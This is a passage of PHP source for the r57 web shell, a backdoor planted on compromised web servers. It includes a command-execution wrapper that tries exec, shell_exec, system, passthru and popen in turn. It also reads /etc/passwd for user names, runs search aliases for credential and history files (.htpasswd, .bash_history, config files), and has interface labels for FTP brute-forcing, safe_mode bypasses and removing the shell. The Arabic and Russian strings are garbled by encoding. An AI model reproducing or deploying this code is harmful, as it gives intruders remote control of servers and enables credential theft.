'eng_text12'=>'ÅÊÕÇá ÚßÓí',
'eng_text13'=>'IP',
'eng_text14'=>'ÇáÈæÑÊ',
'eng_butt4' =>'ÅÊÕÇá',
'eng_text15'=>'ÊÍãíá ãáÝ ãä ãæÞÚ ÎÇÑÌí',
'eng_text16'=>'ãÚ',
'eng_text17'=>'ÚäæÇä ÇáãáÝ',
'eng_text18'=>'ÇáãáÝ Úáì ÇáÓíÑÝÑ',
'eng_text19'=>'ÇáÅÓÊÛáÇá',
'eng_text20'=>'ÅÓÊÎÏÇã',
'eng_text21'=>'&nbsp;ÅÓã ÌÏíÏ',
'eng_text22'=>'datapipe',
'eng_text23'=>'ÇáãäÝÐ ÇáãÍáí',
'eng_text24'=>'ÓíÑÝÑ ÈÚíÏ',
'eng_text25'=>'Remote port',
'eng_text26'=>'ÅÓÊÎÏÇã',
'eng_butt5' =>'ÊÔÛíá',
'eng_text28'=>'ÇáÚãá Ýí ÇáæÖÚ ÇáÂãä',
'eng_text29'=>'áã íÊã ÇáæÕæá',
'eng_butt6' =>'ÊÛíÑ',
'eng_text30'=>'ÚÑÖ ãáÝ',
'eng_butt7' =>'ÅÙåÇÑ',
'eng_text31'=>'ÇáãáÝ ÛíÑ ãæÌæÏ',
'eng_text32'=>'ÇáßæÏ ÇáÎÈíË',
'eng_text33'=>'Test bypass open_basedir with cURL functions',
'eng_butt8' =>'ÅÎÊÈÇÑ',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass safe_mode with load file in mysql',
'eng_text36'=>'ÇáÞÇÚÏÉ',
'eng_text37'=>'ÇáíæÒÑ',
'eng_text38'=>'ÇáÈÇÓæÑÏ',
'eng_text39'=>'ÌÏæá',
'eng_text40'=>'ÃÎÐ äÓÎå ãä ÞæÇÚÏ ÇáÈíÇäÇÊ',
'eng_butt9' =>'ÃÎÐ äÓÎå',
'eng_text41'=>'ÃÎÐ äÓÎå Åáì ãáÝ',
'eng_text42'=>'ÊÍÑíÑ ãáÝ',
'eng_text43'=>'ÇáãáÝ ÇáãÑÇÏ ÊÍÑíÑå',
'eng_butt10'=>'ÊÎÒíä',
'eng_text44'=>'áÇ ÊÓÊØíÚ ÊÍÑíÑ ÇáãáÝ ,ÝÞÏ ÊÓÊØíÚ ÇáÞÑÇÆÉ',
'eng_text45'=>'ÊÎÒíä ãáÝ',
'eng_text46'=>'phpinfo() ÅÙåÇÑ ãÚáæãÇÊ ÇáÜÜ',
'eng_text47'=>'php.ini ÚÑÖ ÇáãÊÛíÑÇÊ ãä',
'eng_text48'=>'ãÓÍ ãáÝÇÊ ÇáÊÈÊ',
'eng_butt11'=>'ÊÍÑíÑ ãáÝ',
'eng_text49'=>'ãÓÍ ÇáÔá ãä ÇáÓíÑÝÑ',
'eng_text50'=>'cpuÚÑÖ ãÚáæãÇÊ',
'eng_text51'=>'ÚÑÖ ÍÌã ÇáÐÇßÑÉ',
'eng_text52'=>'ÈÍË Úä äÕ',
'eng_text53'=>'Ýí ÇáãÌáÏÇÊ',
'eng_text54'=>'ÅÈÍË Úä äÕ Ýí ãáÝ',
'eng_butt12'=>'ÈÍË',
'eng_text55'=>'ÝÞØ Ýí ÇáãáÝÇÊ',
'eng_text56'=>'áÇ ÔíÁ):',
'eng_text57'=>'Êßæíä/ãÓÍ ãáÝ/ãÌáÏ',
'eng_text58'=>'ÇáÅÓã',
'eng_text59'=>'ÇáãáÝ',
'eng_text60'=>'ÇáãÌáÏ',
'eng_butt13'=>'ÅäÔÇÁ/ÍÐÝ',
'eng_text61'=>'ãáÝ ÃäÔÆ',
'eng_text62'=>'ãÌáÏ ÃäÔÆ',
'eng_text63'=>'ÇáãáÝ ÍÐÝ',
'eng_text64'=>'ÇáãÌáÏ ÍÐÝ',
'eng_text65'=>'ÅäÔÇÁ',
'eng_text66'=>'ÍÐÝ',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'ÃãÑ',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'ãÓÊäÏ ááÈÍË',
'eng_text73'=>'ÈÍË Ýí ÇáãÌáÏÇÊ',
'eng_text74'=>'ÈÍË Ýí ÇáãáÝÇÊ',
'eng_text75'=>'* regexp ÊÓÊØíÚ ÅÓÊÏÇã',
'eng_text76'=>'ÇáÈÍË Úä äÕ Ýí ÇáãáÝÇÊ Úä ØÑíÞ ÇáÃãÑ ÈÍË',
'eng_text77'=>'ÅÙåÇÑ ÊÑßíÈÉ ÞÇÚÏÉ ÇáÈíÇäÇÊ',
'eng_text78'=>'ÅÙåÇÑ ÇáÌÏÇæá',
'eng_text79'=>'ÅÙåÇÑ ÇáÃÚãÏÉ',
'eng_text80'=>'ÇáäæÚ',
'eng_text81'=>'ÇáÔÈßÉ',
'eng_text82'=>'ÞæÇÚÏ ÇáÈíÇäÇÊ',
'eng_text83'=>'SQLÔÛá ÅÓÊÚáÇãÇÊ ÇáÜÜ ',
'eng_text84'=>'SQLÅÓÊÚáÇãÇÊ ÇáÜÜ',
'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'eng_text86'=>'ÊäÒíá ãáÝÇÊ ãä ÇáÓíÑÝÑ',
'eng_butt14'=>'ÊäÒíá',
'eng_text87'=>'FTP-serverÊäÒíá ãáÝ ãä ',
'eng_text88'=>'FTP-server:port',
'eng_text89'=>'FTPÇáãáÝ Úáì',
'eng_text90'=>'Transfer mode',
'eng_text91'=>'Archivation',
'eng_text92'=>'without archivation',
'eng_text93'=>'FTP',
'eng_text94'=>'FTP-bruteforce',
'eng_text95'=>'ÞÇÆãÉ ÇáÃÚÖÇÁ',
'eng_text96'=>'Can\'t get users list',
'eng_text97'=>'checked: ',
'eng_text98'=>'success: ',
'eng_text99'=>'* use username from /etc/passwd for ftp login and password',
'eng_text100'=>'FTP-serverÅÑÓÇá ãáÝ Åáì',
'eng_text101'=>'Use reverse (user -> resu) login for password',
'eng_text102'=>'ÇáÈÑíÏ',
'eng_text103'=>'ÅÑÓá ÑÓÇáÉ ÈÑíÏ ÅáßÊÑæäí',
'eng_text104'=>'ÅÑÓÇá ãáÝ Åáì ÈÑíÏ ÅáßÊÑæäí',
'eng_text105'=>'Åáì',
'eng_text106'=>'ãä',
'eng_text107'=>'ÇáÚäæÇä',
'eng_butt15'=>'ÅÑÓÇá',
'eng_text108'=>'ÇáÈÑíÏ',
'eng_text109'=>'ÅÎÝÇÁ',
'eng_text110'=>'ÅÙåÇÑ',
'eng_text111'=>'SQL-Server : Port',
'eng_text112'=>'Test bypass safe_mode with function mb_send_mail',
'eng_text113'=>'Test bypass safe_mode, view dir list via imap_list',
'eng_text114'=>'Test bypass safe_mode, view file contest via imap_body',
);
/*
?????? ??????
????????? ???????? ????????????? ?????? ????? ? ???-?? ??????. ( ??????? ????????? ???? ????????? ???? )
?? ?????? ???? ????????? ??? ???????? ???????.
*/
$aliases=array(
'find suid files'=>'find / -type f -perm -04000 -ls',
'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
'find sgid files'=>'find / -type f -perm -02000 -ls',
'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
'find config.inc.php files'=>'find / -type f -name config.inc.php',
'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
'find config* files'=>'find / -type f -name "config*"',
'find config* files in current dir'=>'find . -type f -name "config*"',
'find all writable files'=>'find / -type f -perm -2 -ls',
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
'find all writable directories'=>'find /  -type d -perm -2 -ls',
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
'find all writable directories and files'=>'find / -perm -2 -ls',
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
'find all service.pwd files'=>'find / -type f -name service.pwd',
'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
'find all .htpasswd files'=>'find / -type f -name .htpasswd',
'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
'find all .bash_history files'=>'find / -type f -name .bash_history',
'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
'find all .mysql_history files'=>'find / -type f -name .mysql_history',
'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history',
'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
'list file attributes on a Linux second extended file system'=>'lsattr -va',
'show opened ports'=>'netstat -an | grep -i listen',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);
$table_up1  = "<tr><td bgcolor=#cccccc><font face=Verdana size=2><b><div align=center>:: ";
$table_up2  = " ::</div></b></font></td></tr><tr><td>";
$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>";
$table_end1 = "</td></tr>";
$arrow = " <font face=Wingdings color=gray>?</font>";
$lb = "<font color=black>[</font>";
$rb = "<font color=black>]</font>";
$font = "<font face=Verdana size=2>";
$ts = "<table class=table1 width=100% align=center>";
$te = "</table>";
$fs = "<form name=form method=POST>";
$fe = "</form>";
if(isset($_GET['users']))
 {
 if(!$users=get_users()) { echo "<center><font face=Verdana size=2 color=red>".$lang[$language.'_text96']."</font></center>"; }
 else
  {
  echo '<center>';
  foreach($users as $user) { echo $user."<br>"; }
  echo '</center>';
  }
 echo "<br><div align=center><font face=Verdana size=2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }
if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
$dir = @getcwd();
$windows = 0;
$unix = 0;
if(strlen($dir)>1 && $dir[1]==":") $windows=1; else $unix=1;
if(empty($dir))
 {
 $os = getenv('OS');
 if(empty($os)){ $os = php_uname(); }
 if(empty($os)){ $os ="-"; $unix=1; }
 else
    {
    if(@eregi("^win",$os)) { $windows = 1; }
    else { $unix = 1; }
    }
 }
if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
  {
    echo $head;
    if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
    else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
    $sr->SearchText(0,0);
    $res = $sr->GetResultFiles();
    $found = $sr->GetMatchesCount();
    $titles = $sr->GetTitles();
    $r = "";
    if($found > 0)
    {
      $r .= "<TABLE width=100%>";
      foreach($res as $file=>$v)
      {
        $r .= "<TR>";
        $r .= "<TD colspan=2><font face=Verdana size=2><b>".ws(3);
        $r .= ($windows)? str_replace("/","\\",$file) : $file;
        $r .= "</b></font></ TD>";
        $r .= "</TR>";
        foreach($v as $a=>$b)
        {
          $r .= "<TR>";
          $r .= "<TD align=center><B><font face=Verdana size=2>".$a."</font></B></TD>";
          $r .= "<TD><font face=Verdana size=2>".ws(2).$b."</font></TD>";
          $r .= "</TR>\n";
        }
      }
      $r .= "</TABLE>";
    echo $r;
    }
    else
    {
      echo "<P align=center><B><font face=Verdana size=2>".$lang[$language.'_text56']."</B></font></P>";
    }
  echo "<br><div align=center><font face=Verdana size=2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die();
  }
if(strpos(ex("echo abcr57"),"r57")!=3) { $safe_mode = 1; }
$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
if(empty($SERVER_SOFTWARE)){ $SERVER_SOFTWARE = "-"; }
function ws($i)
{
return @str_repeat("&nbsp;",$i);
}
function ex($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
 }
 return $res;
}
function get_users()
{
  $users = array();
  $rows=file('/etc/passwd');
  if(!$rows) return 0;
  foreach ($rows as $string)
   {
   	$user = @explode(":",$string);
   	if(substr($string,0,1)!='#') array_push($users,$user[0]);
   }
  return $users;
}
function we($i)
{
if($GLOBALS['language']=="ru"){ $text = '??????! ?? ???? ???????? ? ???? '; }
else { $text = "[-] ERROR! Can't write in file "; }
echo "<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#cccccc><font color=red face=Verdana size=2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function re($i)
{
if($GLOBALS['language']=="ru"){ $text = '??????! ?? ???? ????????? ???? '; }
else { $text = "[-] ERROR! Can't read file "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function ce($i)
{
if($GLOBALS['language']=="ru"){ $text = "?? ??????? ??????? "; }
else { $text = "Can't create "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function fe($l,$n)
{
$text['ru']  = array('?? ??????? ???????????? ? ftp ???????','?????? ??????????? ?? ftp ???????','?? ??????? ???????? ?????????? ?? ftp ???????');
$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\'t change dir on ftp server');
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=2><div align=center><b>".$text[$l][$n]."</b></div></font></td></tr></table>";
return null;
}
function mr($l,$n)
{
$text['ru']  = array('?? ??????? ????????? ??????','?????? ??????????');
$text['eng'] = array('Can\'t send mail','Mail sent');
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=2><div align=center><b>".$text[$l][$n]."</b></div></font></td></tr></table>";
return null;
}
function perms($mode)
{
if ($GLOBALS['windows']) return 0;
if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}
function in($type,$name,$size,$value)
{
 $ret = "<input type=".$type." name=".$name." ";
 if($size != 0) { $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\">";
 return $ret;
}
function which($pr)
{
$path = ex("which $pr");
if(!empty($path)) { return $path; } else { return $pr; }
}
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or we($fname);
 if($w_file)
 {
 @fputs($w_file,@base64_decode($text));
 @fclose($w_file);
 }
}
function sr($l,$t1,$t2)
 {
 return "<tr class=tr1><td class=td1 width=".$l."% align=right>".$t1."</td><td class=td1 align=left>".$t2."</td></tr>";
 }
if (!@function_exists("view_size"))
{
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
  function DirFilesR($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  class SearchResult
  {
    var $text;
    var $FilesToSearch;
    var $ResultFiles;
    var $FilesTotal;
    var $MatchesCount;
    var $FileMatschesCount;
    var $TimeStart;
    var $TimeTotal;
    var $titles;
    function SearchResult($dir,$text,$filter='')
    {
      $dirs = @explode(";",$dir);
      $this->FilesToSearch = Array();
      for($a=0;$a<count($dirs);$a++)
        $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($dirs[$a],$filter));
      $this->text = $text;
      $this->FilesTotal = @count($this->FilesToSearch);
      $this->TimeStart = getmicrotime();
      $this->MatchesCount = 0;
      $this->ResultFiles = Array();
      $this->FileMatchesCount = Array();
      $this->titles = Array();
    }
    function GetFilesTotal() { return $this->FilesTotal; }
    function GetTitles() { return $this->titles; }
    function GetTimeTotal() { return $this->TimeTotal; }
    function GetMatchesCount() { return $this->MatchesCount; }
    function GetFileMatchesCount() { return $this->FileMatchesCount; }
    function GetResultFiles() { return $this->ResultFiles; }
    function SearchText($phrase=0,$case=0) {
    $qq = @explode(' ',$this->text);
    $delim = '|';
      if($phrase)
        foreach($qq as $k=>$v)
          $qq[$k] = '\b'.$v.'\b';
      $words = '('.@implode($delim,$qq).')';
      $pattern = "/".$words."/";
      if(!$case)
        $pattern .= 'i';
      foreach($this->FilesToSearch as $k=>$filename)
      {
        $this->FileMatchesCount[$filename] = 0;
        $FileStrings = @file($filename) or @next;
        for($a=0;$a<@count($FileStrings);$a++)
        {
          $count = 0;
          $CurString = $FileStrings[$a];
          $CurString = @Trim($CurString);
          $CurString = @strip_tags($CurString);
          $aa = '';
          if(($count = @preg_match_all($pattern,$CurString,$aa)))
          {
            $CurString = @preg_replace($pattern,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$CurString);
            $this->ResultFiles[$filename][$a+1] = $CurString;
            $this->MatchesCount += $count;
            $this->FileMatchesCount[$filename] += $count;
          }
        }
      }
      $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
    }
  }
  function getmicrotime()
  {
    list($usec,$sec) = @explode(" ",@microtime());
    return ((float)$usec + (float)$sec);
  }
